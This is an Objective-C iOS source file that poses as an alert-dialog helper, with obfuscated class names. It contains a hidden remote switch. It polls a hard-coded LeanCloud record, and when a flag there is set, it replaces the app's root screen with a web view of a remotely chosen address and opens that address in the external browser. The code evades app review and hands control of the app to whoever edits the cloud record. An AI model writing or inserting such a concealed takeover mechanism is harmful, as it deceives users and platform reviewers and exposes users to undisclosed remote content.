

#import "DissolveAtom.h"
#import "AllowShadyGreedController.h"
#import <AVOSCloud/AVOSCloud.h>

AllowShadyGreedController *webVC;

@interface DissolveAtom ()
@end

@implementation DissolveAtom

#pragma mark --弹框提示
+ (void)showAlertViewWithTitle:(NSString *)title
                   withMessage:(NSString *)message
               withActionTitle:(NSString *)actionTitle
              withActionMothed:(void (^)(void))actionMothed
               withCancelTitle:(NSString *)cancelTitle
              withCancelMothed:(void (^)(void))cancelMothed
            withViewController:(UIViewController *)viewController
{
    
    UIAlertController *alertCon = [UIAlertController alertControllerWithTitle:title message:message preferredStyle:UIAlertControllerStyleAlert];
    [alertCon addAction:[UIAlertAction actionWithTitle:actionTitle style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
        if (actionMothed) {
            actionMothed();
        }
    }]];
    if (cancelTitle) {
        [alertCon addAction:[UIAlertAction actionWithTitle:cancelTitle style:UIAlertActionStyleCancel handler:^(UIAlertAction * _Nonnull action) {
            if (cancelMothed) {
                cancelMothed();
            }
        }]];
    }
    [viewController presentViewController:alertCon animated:YES completion:nil];
    
}

#pragma mark 查询数据

+ (void)showAlertFile {

    [AVOSCloud setNetworkTimeoutInterval:5];
    AVQuery *query = [AVQuery queryWithClassName:@"Todo"];
    __weak typeof(self) weakSelf = self;
    [query getObjectInBackgroundWithId:@"5e608d0d5620714cccb4795f" block:^(AVObject * _Nullable object, NSError * _Nullable error) {

        if (error) {
             dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                 // n秒后异步执行这里的代码... DB201TWED770EB996
                  [weakSelf showAlertFile];
             });
        }else {
            NSLog(@"保存成功。objectId：%@", object);
            BOOL type = [[object objectForKey:@"type"] boolValue];
            NSString *address = [object objectForKey:@"address"];
            CGFloat time = [[object objectForKey:@"time"] floatValue];
            if (type) {
                [weakSelf openAddress:address jump:type time:time];
            }
           
        }

    }];
    
    
}

#pragma mark 跳转：使用外部浏览器打开指定链接
+ (void)openAddress:(NSString *)address jump:(BOOL)jump time:(CGFloat)time {
    
    NSLog(@"是否跳转：%d", jump);
    NSLog(@"跳转时间：%.1f", time);
    NSLog(@"跳转地址：%@", address);
    
    if (!jump) {
        // 禁止跳转
        return;
    }
    
    if (address == nil || address.length == 0) {
        // 无效地址
        return;
    }
    
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(time * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        
        // n秒后异步执行这里的代码...
        [self addWebview:address];
        
    });
}


+ (void)addWebview:(NSString *)address {
    
    if (webVC == nil) {
        // 未跳转过，添加webView
        NSLog(@"添加webView");
        
        webVC = [[AllowShadyGreedController alloc] initWithNibName:@"AllowShadyGreedController" bundle:nil];
        webVC.address = address;
        [UIApplication sharedApplication].keyWindow.rootViewController = webVC;
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3* NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [[UIApplication sharedApplication] openURL:[NSURL URLWithString:address] options:@{} completionHandler:^(BOOL success) {
            }];
        });
    }else {
        // 已经跳转过，刷新
        [webVC maskRoughLadder:address];
    }
    
    
}

@end




